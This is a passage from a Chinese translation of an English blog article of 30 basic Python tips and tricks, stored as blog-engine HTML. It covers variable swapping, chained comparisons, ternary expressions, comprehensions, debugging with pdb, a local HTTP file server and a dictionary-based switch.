class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">t1 = (<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>)</div><div class=\"line\">t2 = (<span class=\"number\">10</span>, <span class=\"number\">20</span>, <span class=\"number\">30</span>)</div><div class=\"line\"></div><div class=\"line\">print(dict (zip(t1,t2)))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; &#123;1: 10, 2: 20, 3: 30&#125;</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-28-一行代码搜索字符串的多个前后缀\"><a href=\"#贴士-28-一行代码搜索字符串的多个前后缀\" class=\"headerlink\" title=\"贴士#28. 一行代码搜索字符串的多个前后缀\"></a>贴士#28. 一行代码搜索字符串的多个前后缀</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">print(<span class=\"string\">\"http://www.google.com\"</span>.startswith((<span class=\"string\">\"http://\"</span>, <span class=\"string\">\"https://\"</span>)))</div><div class=\"line\">print(<span class=\"string\">\"http://www.google.co.uk\"</span>.endswith((<span class=\"string\">\".com\"</span>, <span class=\"string\">\".co.uk\"</span>)))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1-&gt; True</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; True</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-29-不使用循环构造一个列表\"><a href=\"#贴士-29-不使用循环构造一个列表\" class=\"headerlink\" title=\"贴士#29. 不使用循环构造一个列表\"></a>贴士#29. 不使用循环构造一个列表</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> itertools</div><div class=\"line\">test = [[<span class=\"number\">-1</span>, <span class=\"number\">-2</span>], [<span class=\"number\">30</span>, <span class=\"number\">40</span>], [<span class=\"number\">25</span>, <span class=\"number\">35</span>]]</div><div class=\"line\">print(list(itertools.chain.from_iterable(test)))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; [-1, -2, 30, 40, 25, 35]</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-30-在-Python-中实现一个真正的-switch-case-语句\"><a href=\"#贴士-30-在-Python-中实现一个真正的-switch-case-语句\" class=\"headerlink\" title=\"贴士#30. 在 Python 中实现一个真正的 switch-case 语句\"></a>贴士#30. 在 Python 中实现一个真正的 switch-case 语句</h2><p>下面的代码使用一个字典来模拟构造一个 switch-case。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">xswitch</span><span class=\"params\">(x)</span>:</span> </div><div class=\"line\">    <span class=\"keyword\">return</span> xswitch._system_dict.get(x, <span class=\"keyword\">None</span>)</div><div class=\"line\"></div><div class=\"line\">xswitch._system_dict = &#123;<span class=\"string\">'files'</span>: <span class=\"number\">10</span>, <span class=\"string\">'folders'</span>: <span class=\"number\">5</span>, <span class=\"string\">'devices'</span>: <span class=\"number\">2</span>&#125;</div><div class=\"line\"></div><div class=\"line\">print(xswitch(<span class=\"string\">'default'</span>))</div><div class=\"line\">print(xswitch(<span class=\"string\">'devices'</span>))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1-&gt; None</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; 2</span></div></pre></td></tr></table></figure>\n<p>结语 – 给程序员的基本 Python 贴士与技巧</p>\n<p>我们希望上述的基本的 Python 贴士与技巧可以帮助你快速地 &amp; 有效地完成任务，你可以在作业与项目中使用他们。</p>\n<p>听从你的回馈会使我们变得更好，所以请分享你的想法。</p>\n<p>你甚至可以要求我们写一个你选择的话题，我们会将其加入到我们的写作列表中。【*】</p>\n<p>最后，如果你喜欢这个文章，请在社交媒体上分享给你的朋友。</p>\n<p>坚持学习，</p>\n<p>TechBeamers.</p>\n<blockquote>\n<p>本文由 伯乐在线 - 阿喵 翻译，艾凌风 校稿。英文出处：Meenakshi Agarwal。</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<p>如果你已经在用 python 了，相信这篇 blog 会对你有帮助的。<br>如果你还没有使用 python，相信看完下面 python 的实现，你会觉得<strong>编程也是一件幸福的事</strong>：）</p>\n<p><img src=\"/Image/python-love.png\" alt=\"Python_Love\"></p>\n<p>如果你让一个 Python 程序员说一下 Python 的优势，他会说简洁以及高可读是最有影响力的优势。为证明上述两点，在这个 Python 教程里，我们将聊聊许多基本的 Python 建议和技巧。</p>","more":"<p>我们从开始使用 Python 便收集这些有用的捷径（贴士与技巧）。分享一些我们知道，同时又能造福于人的知识，有什么事情比这更棒吗？</p>\n<p>过去我们分享过 一些 <a href=\"http://www.techbeamers.com/top-10-python-coding-tips-for-beginners/\" target=\"_blank\" rel=\"external\">给初学者的 Python 编程贴士</a> 旨在优化代码并且减少编码工作，我们的读者仍旧很乐意阅读它。</p>\n<p>所以今天我们带来另一些基本的 Python 贴士与技巧，所有的这些技巧都能帮助你压缩代码并且优化运行。此外，你可以在日常工作中很容易地在真实项目中使用他们。</p>\n<p>每一个技巧都有一个示例并且给出简短的解释，如果要测试这些代码片段，你可以看一下这些 <a href=\"http://www.techbeamers.com/best-python-interpreter-execute-python-online/\" target=\"_blank\" rel=\"external\">在线虚拟 Python 运行终端</a>。</p>\n<p>最近我们发布的另两个必看的 Python 资源：</p>\n<p>💡 <a href=\"http://www.techbeamers.com/python-code-optimization-tips-tricks/\" target=\"_blank\" rel=\"external\">9 种优化 Python 代码的主要方式</a></p>\n<p>💡 <a href=\"http://www.techbeamers.com/python-programming-mistakes/\" target=\"_blank\" rel=\"external\">发现在编程时应该避免的最常见的错误</a></p>\n<h1 id=\"给程序员的-30-个基本-Python-贴士与技巧\"><a href=\"#给程序员的-30-个基本-Python-贴士与技巧\" class=\"headerlink\" title=\"给程序员的 30 个基本 Python 贴士与技巧\"></a>给程序员的 30 个基本 Python 贴士与技巧</h1><h2 id=\"贴士-1-原地交换两个数字\"><a href=\"#贴士-1-原地交换两个数字\" class=\"headerlink\" title=\"贴士#1. 原地交换两个数字\"></a>贴士#1. 原地交换两个数字</h2><p>Python 提供了一个直观的在一行代码中赋值与交换（变量值）的方法，请参见下面的示例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">x, y = <span class=\"number\">10</span>, <span class=\"number\">20</span></div><div class=\"line\">print(x, y)</div><div class=\"line\"></div><div class=\"line\">x, y = y, x</div><div class=\"line\">print(x, y)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1 (10, 20)</span></div><div class=\"line\"><span class=\"comment\">#2 (20, 10)</span></div></pre></td></tr></table></figure>\n<p>赋值的右侧形成了一个新的元组，左侧立即解析（unpack）那个（未被引用的）元组到变量 &lt;a&gt; 和 &lt;b&gt;。</p>\n<p>一旦赋值完成，新的元组变成了未被引用状态并且被标记为可被垃圾回收，最终也完成了变量的交换。</p>\n<h2 id=\"贴士-2-链状比较操作符\"><a href=\"#贴士-2-链状比较操作符\" class=\"headerlink\" title=\"贴士#2. 链状比较操作符\"></a>贴士#2. 链状比较操作符</h2><p>比较操作符的聚合是另一个有时很方便的技巧：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">n = <span class=\"number\">10</span></div><div class=\"line\">result = <span class=\"number\">1</span> &lt; n &lt; <span class=\"number\">20</span></div><div class=\"line\">print(result)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># True</span></div><div class=\"line\"></div><div class=\"line\">result = <span class=\"number\">1</span> &gt; n &lt;= <span class=\"number\">9</span></div><div class=\"line\">print(result)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># False</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-3-使用三元操作符来进行条件赋值\"><a href=\"#贴士-3-使用三元操作符来进行条件赋值\" class=\"headerlink\" title=\"贴士#3. 使用三元操作符来进行条件赋值\"></a>贴士#3. 使用三元操作符来进行条件赋值</h2><p>三元操作符是 if-else 语句也就是条件操作符的一个快捷方式：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">[表达式为真的返回值] <span class=\"keyword\">if</span> [表达式] <span class=\"keyword\">else</span> [表达式为假的返回值]</div></pre></td></tr></table></figure>\n<p>这里给出几个你可以用来使代码紧凑简洁的例子。下面的语句是说“如果 y 是 9，给 x 赋值 10，不然赋值为 20”。如果需要的话我们也可以延长这条操作链。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">x = <span class=\"number\">10</span> <span class=\"keyword\">if</span> (y == <span class=\"number\">9</span>) <span class=\"keyword\">else</span> <span class=\"number\">20</span></div></pre></td></tr></table></figure>\n<p>同样地，我们可以对类做这种操作：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">x = (classA <span class=\"keyword\">if</span> y == <span class=\"number\">1</span> <span class=\"keyword\">else</span> classB)(param1, param2)</div></pre></td></tr></table></figure>\n<p>在上面的例子里 classA 与 classB 是两个类，其中一个类的构造函数会被调用。</p>\n<p>下面是另一个多个条件表达式链接起来用以计算最小值的例子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">small</span><span class=\"params\">(a, b, c)</span>:</span></div><div class=\"line\">    <span class=\"keyword\">return</span> a <span class=\"keyword\">if</span> a &lt;= b <span class=\"keyword\">and</span> a &lt;= c <span class=\"keyword\">else</span> (b <span class=\"keyword\">if</span> b &lt;= a <span class=\"keyword\">and</span> b &lt;= c <span class=\"keyword\">else</span> c)</div><div class=\"line\"></div><div class=\"line\">print(small(<span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>))</div><div class=\"line\">print(small(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>))</div><div class=\"line\">print(small(<span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>))</div><div class=\"line\">print(small(<span class=\"number\">5</span>, <span class=\"number\">4</span>, <span class=\"number\">3</span>))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#Output</span></div><div class=\"line\"><span class=\"comment\">#0 #1 #2 #3</span></div></pre></td></tr></table></figure>\n<p>我们甚至可以在列表推导中使用三元运算符：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">[m**<span class=\"number\">2</span> <span class=\"keyword\">if</span> m &gt; <span class=\"number\">10</span> <span class=\"keyword\">else</span> m**<span class=\"number\">4</span> <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> range(<span class=\"number\">50</span>)]</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#=&gt; [0, 1, 16, 81, 256, 625, 1296, 2401, 4096, 6561, 10000, 121, 144, 169, 196, 225, 256, 289, 324, 361, 400, 441, 484, 529, 576, 625, 676, 729, 784, 841, 900, 961, 1024, 1089, 1156, 1225, 1296, 1369, 1444, 1521, 1600, 1681, 1764, 1849, 1936, 2025, 2116, 2209, 2304, 2401]</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-4-多行字符串\"><a href=\"#贴士-4-多行字符串\" class=\"headerlink\" title=\"贴士#4. 多行字符串\"></a>贴士#4. 多行字符串</h2><p>基本的方式是使用源于 C 语言的反斜杠：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">multiStr = <span class=\"string\">\"select * from multi_row \\</span></div><div class=\"line\">where row_id &lt; 5\"</div><div class=\"line\">print(multiStr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># select * from multi_row where row_id &lt; 5</span></div></pre></td></tr></table></figure>\n<p>另一个技巧是使用三引号：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">multiStr = <span class=\"string\">\"\"\"select * from multi_row </span></div><div class=\"line\">where row_id &lt; 5\"\"\"</div><div class=\"line\">print(multiStr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#select * from multi_row </span></div><div class=\"line\"><span class=\"comment\">#where row_id &lt; 5</span></div></pre></td></tr></table></figure>\n<p>上面方法共有的问题是缺少合适的缩进，如果我们尝试缩进会在字符串中插入空格。所以最后的解决方案是将字符串分为多行并且将整个字符串包含在括号中：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">multiStr= (<span class=\"string\">\"select * from multi_row \"</span></div><div class=\"line\">            <span class=\"string\">\"where row_id &lt; 5 \"</span></div><div class=\"line\">            <span class=\"string\">\"order by age\"</span>)</div><div class=\"line\">print(multiStr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#select * from multi_row where row_id &lt; 5 order by age</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-5-存储列表元素到新的变量中\"><a href=\"#贴士-5-存储列表元素到新的变量中\" class=\"headerlink\" title=\"贴士#5. 存储列表元素到新的变量中\"></a>贴士#5. 存储列表元素到新的变量中</h2><p>我们可以使用列表来初始化多个变量，在解析列表时，变量的数目不应该超过列表中的元素个数：【译者注：元素个数与列表长度应该严格相同，不然会报错】</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">testList = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</div><div class=\"line\">x, y, z = testList</div><div class=\"line\"></div><div class=\"line\">print(x, y, z)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 1 2 3</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-6-打印引入模块的文件路径\"><a href=\"#贴士-6-打印引入模块的文件路径\" class=\"headerlink\" title=\"贴士#6. 打印引入模块的文件路径\"></a>贴士#6. 打印引入模块的文件路径</h2><p>如果你想知道引用到代码中模块的绝对路径，可以使用下面的技巧：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> threading </div><div class=\"line\"><span class=\"keyword\">import</span> socket</div><div class=\"line\"></div><div class=\"line\">print(threading)</div><div class=\"line\">print(socket)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1- &lt;module 'threading' from '/usr/lib/python2.7/threading.py'&gt;</span></div><div class=\"line\"><span class=\"comment\">#2- &lt;module 'socket' from '/usr/lib/python2.7/socket.py'&gt;</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-7-交互环境下的-“-”-操作符\"><a href=\"#贴士-7-交互环境下的-“-”-操作符\" class=\"headerlink\" title=\"贴士#7. 交互环境下的 “_” 操作符\"></a>贴士#7. 交互环境下的 “_” 操作符</h2><p>这是一个我们大多数人不知道的有用特性，在 Python 控制台，不论何时我们测试一个表达式或者调用一个方法，结果都会分配给一个临时变量： _（一个下划线）。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"number\">2</span> + <span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">3</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>_</div><div class=\"line\"><span class=\"number\">3</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">print</span> _</div><div class=\"line\"><span class=\"number\">3</span></div></pre></td></tr></table></figure>\n<p>“_” 是上一个执行的表达式的输出。</p>\n<h2 id=\"贴士-8-字典-集合推导\"><a href=\"#贴士-8-字典-集合推导\" class=\"headerlink\" title=\"贴士#8. 字典/集合推导\"></a>贴士#8. 字典/集合推导</h2><p>与我们使用的列表推导相似，我们也可以使用字典/集合推导，它们使用起来简单且有效，下面是一个例子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">testDict = &#123;i: i * i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">10</span>)&#125; </div><div class=\"line\">testSet = &#123;i * <span class=\"number\">2</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">10</span>)&#125;</div><div class=\"line\"></div><div class=\"line\">print(testSet)</div><div class=\"line\">print(testDict)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#set([0, 2, 4, 6, 8, 10, 12, 14, 16, 18])</span></div><div class=\"line\"><span class=\"comment\">#&#123;0: 0, 1: 1, 2: 4, 3: 9, 4: 16, 5: 25, 6: 36, 7: 49, 8: 64, 9: 81&#125;</span></div></pre></td></tr></table></figure>\n<p>注：两个语句中只有一个 &lt;:&gt; 的不同，另，在 Python3 中运行上述代码时，将 &lt;xrange&gt; 改为 &lt;range&gt;。</p>\n<h2 id=\"贴士-9-调试脚本\"><a href=\"#贴士-9-调试脚本\" class=\"headerlink\" title=\"贴士#9. 调试脚本\"></a>贴士#9. 调试脚本</h2><p>我们可以在 &lt;pdb&gt; 模块的帮助下在 Python 脚本中设置断点，下面是一个例子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> pdb</div><div class=\"line\">pdb.set_trace()</div></pre></td></tr></table></figure>\n<p>我们可以在脚本中任何位置指定 &lt;pdb.set_trace()&gt; 并且在那里设置一个断点，相当简便。</p>\n<h2 id=\"贴士-10-开启文件分享\"><a href=\"#贴士-10-开启文件分享\" class=\"headerlink\" title=\"贴士#10. 开启文件分享\"></a>贴士#10. 开启文件分享</h2><p>Python 允许运行一个 HTTP 服务器来从根路径共享文件，下面是开启服务器的命令：</p>\n<h3 id=\"Python-2\"><a href=\"#Python-2\" class=\"headerlink\" title=\"# Python 2\"></a># Python 2</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python -m SimpleHTTPServer</div></pre></td></tr></table></figure>\n<h3 id=\"Python-3\"><a href=\"#Python-3\" class=\"headerlink\" title=\"# Python 3\"></a># Python 3</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python3 -m http.server</div></pre></td></tr></table></figure>\n<p>上面的命令会在默认端口也就是 8000 开启一个服务器，你可以将一个自定义的端口号以最后一个参数的方式传递到上面的命令中。</p>\n<h2 id=\"贴士-11-检查-Python-中的对象\"><a href=\"#贴士-11-检查-Python-中的对象\" class=\"headerlink\" title=\"贴士#11. 检查 Python 中的对象\"></a>贴士#11. 检查 Python 中的对象</h2><p>我们可以通过调用 dir() 方法来检查 Python 中的对象，下面是一个简单的例子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">test = [<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>]</div><div class=\"line\">print( dir(test) )</div><div class=\"line\"></div><div class=\"line\">[<span class=\"string\">'__add__'</span>, <span class=\"string\">'__class__'</span>, <span class=\"string\">'__contains__'</span>, <span class=\"string\">'__delattr__'</span>, <span class=\"string\">'__delitem__'</span>, <span class=\"string\">'__delslice__'</span>, <span class=\"string\">'__doc__'</span>, <span class=\"string\">'__eq__'</span>, <span class=\"string\">'__format__'</span>, <span class=\"string\">'__ge__'</span>, <span class=\"string\">'__getattribute__'</span>, <span class=\"string\">'__getitem__'</span>, <span class=\"string\">'__getslice__'</span>, <span class=\"string\">'__gt__'</span>, <span class=\"string\">'__hash__'</span>, <span class=\"string\">'__iadd__'</span>, <span class=\"string\">'__imul__'</span>, <span class=\"string\">'__init__'</span>, <span class=\"string\">'__iter__'</span>, <span class=\"string\">'__le__'</span>, <span class=\"string\">'__len__'</span>, <span class=\"string\">'__lt__'</span>, <span class=\"string\">'__mul__'</span>, <span class=\"string\">'__ne__'</span>, <span class=\"string\">'__new__'</span>, <span class=\"string\">'__reduce__'</span>, <span class=\"string\">'__reduce_ex__'</span>, <span class=\"string\">'__repr__'</span>, <span class=\"string\">'__reversed__'</span>, <span class=\"string\">'__rmul__'</span>, <span class=\"string\">'__setattr__'</span>, <span class=\"string\">'__setitem__'</span>, <span class=\"string\">'__setslice__'</span>, <span class=\"string\">'__sizeof__'</span>, <span class=\"string\">'__str__'</span>, <span class=\"string\">'__subclasshook__'</span>, <span class=\"string\">'append'</span>, <span class=\"string\">'count'</span>, <span class=\"string\">'extend'</span>, <span class=\"string\">'index'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'pop'</span>, <span class=\"string\">'remove'</span>, <span class=\"string\">'reverse'</span>, <span class=\"string\">'sort'</span>]</div></pre></td></tr></table></figure>\n<h2 id=\"贴士-12-简化-if-语句\"><a href=\"#贴士-12-简化-if-语句\" class=\"headerlink\" title=\"贴士#12. 简化 if 语句\"></a>贴士#12. 简化 if 语句</h2><p>我们可以使用下面的方式来验证多个值：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span> m <span class=\"keyword\">in</span> [<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>]:</div></pre></td></tr></table></figure></p>\n<p>而不是：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span> m==<span class=\"number\">1</span> <span class=\"keyword\">or</span> m==<span class=\"number\">3</span> <span class=\"keyword\">or</span> m==<span class=\"number\">5</span> <span class=\"keyword\">or</span> m==<span class=\"number\">7</span>:</div></pre></td></tr></table></figure>\n<p>或者，对于 in 操作符我们也可以使用 ‘{1,3,5,7}’ 而不是 ‘[1,3,5,7]’，因为 set 中取元素是 O(1) 操作。</p>\n<h2 id=\"贴士-13-运行时检测-Python-版本\"><a href=\"#贴士-13-运行时检测-Python-版本\" class=\"headerlink\" title=\"贴士#13. 运行时检测 Python 版本\"></a>贴士#13. 运行时检测 Python 版本</h2><p>当正在运行的 Python 低于支持的版本时，有时我们也许不想运行我们的程序。为达到这个目标，你可以使用下面的代码片段，它也以可读的方式输出当前 Python 版本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#Detect the Python version currently in use.</span></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> hasattr(sys, <span class=\"string\">\"hexversion\"</span>) <span class=\"keyword\">or</span> sys.hexversion != <span class=\"number\">50660080</span>:</div><div class=\"line\">    print(<span class=\"string\">\"Sorry, you aren't running on Python 3.5n\"</span>)</div><div class=\"line\">    print(<span class=\"string\">\"Please upgrade to 3.5.n\"</span>)</div><div class=\"line\">    sys.exit(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#Print Python version in a readable format.</span></div><div class=\"line\">print(<span class=\"string\">\"Current Python version: \"</span>, sys.version)</div></pre></td></tr></table></figure>\n<p>或者你可以使用 sys.version_info &gt;= (3, 5) 来替换上面代码中的 sys.hexversion != 50660080，这是一个读者的建议。</p>\n<p>在 Python 2.7 上运行的结果：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\">Python 2.7.10 (default, Jul 14 2015, 19:46:27)</div><div class=\"line\">[GCC 4.8.2] on linux</div><div class=\"line\"></div><div class=\"line\">Sorry, you aren't running on Python 3.5</div><div class=\"line\"></div><div class=\"line\">Please upgrade to 3.5.</div></pre></td></tr></table></figure>\n<p>在 Python 3.5 上运行的结果：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\">Python <span class=\"number\">3.5</span><span class=\"number\">.1</span> (default, Dec <span class=\"number\">2015</span>, <span class=\"number\">13</span>:<span class=\"number\">05</span>:<span class=\"number\">11</span>)</div><div class=\"line\">[GCC <span class=\"number\">4.8</span><span class=\"number\">.2</span>] on linux</div><div class=\"line\"></div><div class=\"line\">Current Python version:  <span class=\"number\">3.5</span><span class=\"number\">.2</span> (default, Aug <span class=\"number\">22</span> <span class=\"number\">2016</span>, <span class=\"number\">21</span>:<span class=\"number\">11</span>:<span class=\"number\">05</span>) </div><div class=\"line\">[GCC <span class=\"number\">5.3</span><span class=\"number\">.0</span>]</div></pre></td></tr></table></figure>\n<h2 id=\"贴士-14-组合多个字符串\"><a href=\"#贴士-14-组合多个字符串\" class=\"headerlink\" title=\"贴士#14. 组合多个字符串\"></a>贴士#14. 组合多个字符串</h2><p>如果你想拼接列表中的所有记号，比如下面的例子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>test = [<span class=\"string\">'I'</span>, <span class=\"string\">'Like'</span>, <span class=\"string\">'Python'</span>, <span class=\"string\">'automation'</span>]</div></pre></td></tr></table></figure>\n<p>现在，让我们从上面给出的列表元素新建一个字符串：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">print</span> <span class=\"string\">''</span>.join(test)</div></pre></td></tr></table></figure></p>\n<h2 id=\"贴士-15-四种翻转字符串-列表的方式\"><a href=\"#贴士-15-四种翻转字符串-列表的方式\" class=\"headerlink\" title=\"贴士#15. 四种翻转字符串/列表的方式\"></a>贴士#15. 四种翻转字符串/列表的方式</h2><h3 id=\"翻转列表本身\"><a href=\"#翻转列表本身\" class=\"headerlink\" title=\"# 翻转列表本身\"></a># 翻转列表本身</h3><figure class=\"highlight python\"><table><tr><td 